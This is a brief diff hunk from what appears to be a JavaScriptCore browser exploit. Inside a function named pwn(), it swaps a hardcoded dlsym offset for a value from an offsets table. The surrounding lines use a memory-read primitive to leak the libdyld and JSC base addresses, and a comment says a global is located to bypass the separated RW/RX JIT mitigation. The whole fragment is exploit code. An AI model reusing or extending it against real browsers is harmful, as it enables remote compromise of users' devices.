@@ -226,7 +226,7 @@ function pwn() {
     log(`[+] libdyld base = ${(libdyld_base)} -> ${read64(libdyld_base)}`);
 
     // needed arguments to call stage1's _load
-    var dlsym = Add(libdyld_base, 0x4A08);
+    var dlsym = Add(libdyld_base, offsets.dlsym);
 
     // needed to bypass seperated RW, RX JIT mitigation
     var __MergedGlobals_52 = read64(Add(jsc_base, offsets.__MergedGlobals_52));
